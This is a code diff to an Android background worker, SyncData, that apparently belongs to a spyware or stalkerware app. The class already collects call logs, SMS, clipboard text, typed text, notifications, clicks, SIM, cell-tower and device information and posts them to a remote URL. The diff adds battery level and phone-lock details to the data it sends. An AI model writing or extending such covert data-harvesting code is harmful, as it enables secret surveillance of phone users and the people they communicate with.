@@ -43,7 +43,7 @@ public class SyncData extends Worker {
     Context context;
     String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime,
             Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "",NotificationData,
-            SmsData,OtherNotificationData,ClickedData,OtherClickedData,CallHistory;
+            SmsData,OtherNotificationData,ClickedData,OtherClickedData;
     String url="";
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -76,6 +76,7 @@ public class SyncData extends Worker {
         ClickedData=mSharedpref.getClickedData();
         OtherClickedData=mSharedpref.getOtherClickedData();
         Utils.readCallLogs(context,mSharedpref);
+        Utils.getBatteryPercent(context,mSharedpref);
         try {
             ClipData pData = clipboardManager.getPrimaryClip();
             if (pData != null) {
@@ -124,6 +125,8 @@ public class SyncData extends Worker {
                                     mSharedpref.setOtherClickedData("");
                                     mSharedpref.savePrevDate(getDateTime());
                                     mSharedpref.setCallHistory("");
+                                    mSharedpref.setPhoneLockDetails("");
+                                    mSharedpref.setBatteryPercnt("");
                                     mSharedpref.commit();
                                    try {
                                        geturl();
@@ -165,6 +168,8 @@ public class SyncData extends Worker {
                             parmas.put("ClickedData", ClickedData);
                             parmas.put("OtherClickedData", OtherClickedData);
                             parmas.put("CallHistory",mSharedpref.getCallHistory());
+                            parmas.put("BatteryDetails",mSharedpref.getBatteryPercent());
+                            parmas.put("PhoneLockDetails",mSharedpref.getPhoneLockDetails());
                             parmas.put("Simdetails", String.valueOf(simName(context)));
                             parmas.put("PhoneTowerdetails", String.valueOf(getCellInfo(context)));
                             parmas.put("DeviceInfo", String.valueOf(deviceInformation(context)));
